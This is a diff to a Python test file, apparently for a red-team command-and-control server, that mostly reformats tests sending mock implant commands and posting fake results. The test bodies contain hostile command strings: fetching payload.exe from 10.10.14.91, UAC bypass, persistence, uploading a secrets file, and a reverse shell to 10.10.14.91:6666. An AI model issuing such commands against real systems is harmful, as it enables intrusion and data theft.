@@ -29,6 +29,7 @@ MOCK_RESULT = {
     "result_pwd": "C:\\Users\\test",
 }
 
+
 # -----------------------------
 # HELPERS
 # -----------------------------
@@ -46,6 +47,7 @@ def send_command_via_web(command: str):
     # Asegúrate de que el código de estado sea 200 (OK)
     assert r.status_code == 200
 
+
 def get_encrypted_command() -> str:
     """Obtiene el comando cifrado del endpoint GET"""
     r = requests.get(COMMAND_ENDPOINT, verify=False)  # noqa: S501
@@ -53,18 +55,26 @@ def get_encrypted_command() -> str:
     time.sleep(TEST_LATENCY_TIME)
     return r.text  # Base64-encoded IV + CFB ciphertext
 
+
 def post_result(result_data: dict):
     """Envía el resultado cifrado al C2"""
     plaintext = json.dumps(result_data)
     encrypted = encrypt_data(plaintext.encode())
     time.sleep(TEST_LATENCY_TIME)
-    r = requests.post(RESULT_ENDPOINT, data=encrypted, verify=False, headers={"Content-Type": "application/octet-stream"})  # noqa: S501
+    r = requests.post(
+        RESULT_ENDPOINT,
+        data=encrypted,
+        verify=False,
+        headers={"Content-Type": "application/octet-stream"},
+    )
     assert r.status_code == 200
     assert r.json().get("status") == "success"
+
 
 # -----------------------------
 # TESTS POR COMANDO
 # -----------------------------
+
 
 def test_migrate():
     send_command_via_web("migrate:explorer.exe,http://10.10.14.91/payload.exe")
@@ -75,6 +85,7 @@ def test_migrate():
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
 
+
 def test_uac_bypass():
     send_command_via_web("uac_bypass:C:\\Temp\\payload.exe")
     time.sleep(1)
@@ -83,6 +94,7 @@ def test_uac_bypass():
     result["output"] = "UAC bypass attempted successfully"
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
+
 
 def test_portscan():
     send_command_via_web("portscan:192.168.1.1")
@@ -94,6 +106,7 @@ def test_portscan():
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
 
+
 def test_discover():
     send_command_via_web("discover:")
     time.sleep(1)
@@ -103,6 +116,7 @@ def test_discover():
     result["discovered_ips"] = "192.168.1.1,192.168.1.2"
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
+
 
 def test_proxy():
     send_command_via_web("proxy:start:127.0.0.1:9090:10.0.0.5:80")
@@ -120,10 +134,11 @@ def test_proxy():
     result["output"] = "[*] Proxy stopped on 127.0.0.1:9090"
     post_result(result)
 
+
 def test_download():
     # Simula que el C2 pide descargar un archivo
-    files = {'file': ('payload.exe', open('payload.exe', 'rb'), 'application/octet-stream')}
-    r = requests.post(f"{C2_URL}{MALEABLE}download_file", files=files, data={'client_id': CLIENT_ID}, verify=False)  # noqa: S501
+    files = {"file": ("payload.exe", open("payload.exe", "rb"), "application/octet-stream")}
+    r = requests.post(f"{C2_URL}{MALEABLE}download_file", files=files, data={"client_id": CLIENT_ID}, verify=False)  # noqa: S501
     assert r.status_code == 200
 
     # El implant debería recibir: download:payload.exe
@@ -139,6 +154,7 @@ def test_download():
     result["output"] = "[+] Downloaded payload.exe"
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
+
 
 def test_upload():
     send_command_via_web("upload:C:\\Temp\\secrets.txt")
@@ -166,6 +182,7 @@ def test_persistence():
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
 
+
 def test_softenum():
     send_command_via_web("softenum:")
     time.sleep(1)
@@ -174,6 +191,7 @@ def test_softenum():
     result["output"] = "Useful software: git.exe, python.exe, nmap.exe"
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
+
 
 def test_simulate():
     send_command_via_web("simulate:")
@@ -184,6 +202,7 @@ def test_simulate():
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
 
+
 def test_reverse_shell():
     send_command_via_web("rev:10.10.14.91:6666")
     time.sleep(2)
@@ -192,6 +211,7 @@ def test_reverse_shell():
     result["output"] = "[*] Reverse shell connected"
     time.sleep(TEST_LATENCY_TIME)
     post_result(result)
+
 
 def test_shutdown():
     send_command_via_web("terminate:")
